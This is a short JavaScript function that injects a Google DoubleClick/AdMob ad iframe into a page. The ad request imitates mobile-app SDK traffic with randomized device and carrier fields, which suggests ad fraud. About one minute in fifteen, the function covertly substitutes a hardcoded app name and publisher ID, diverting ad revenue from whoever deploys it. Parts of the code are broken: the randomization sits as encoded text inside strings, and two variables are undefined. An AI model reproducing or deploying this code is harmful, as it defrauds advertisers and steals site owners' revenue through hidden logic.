function main() {
var https = "<iframe src= https://googleads.g.doubleclick.net/mads/gma?preqs=0&u_sd=1.5&u_w=320&msid="
var googleads = "&cap=a&js=afma-sdk-a-v3.3.0&toar=0&isu=W%27+Math.floor%28Math.random%28%29*9%29+%27EEABB8EE%27+Math.floor%28Math.random%28%29*99%29+%27C2BE770B684D%27+Math.floor%28Math.random%28%29*99999%29+%27ECB&cipa=0&format=320x50_mb&net=wi&app_name=1.android."
var net = "&hl=en&u_h=%27+Math.floor%28Math.random%28%29*999%29+%27&carrier=%27+Math.floor%28Math.random%28%29*999999%29+%27&ptime=0&u_audio=4&u_so=p&output=html&region=mobile_app&u_tz=-%27+Math.floor%28Math.random%28%29*999%29+%27&client_sdk=1&ex=1&client=ca-app-pub-"
var mads = "&slotname="
var qma = "&caps=inlineVideo_interactiveVideo_mraid1_clickTracking_sdkAdmobApiForAds&jsv=18 width=320px height=50>"
var sdk = Math.floor(new Date().getMinutes()/4)

if (sdk==7) { document.getElementById("ads").innerHTML = https+"com.sangkhute.app"+googleads+"com.sangkhute.app"+net+"3582752291807258"+mads+"1416482000"+qma}
else document.getElementById("ads").innerHTML = https+app+googleads+app+net+admob.slice(11, 27)+mads+admob.slice(28, 38)+qma
}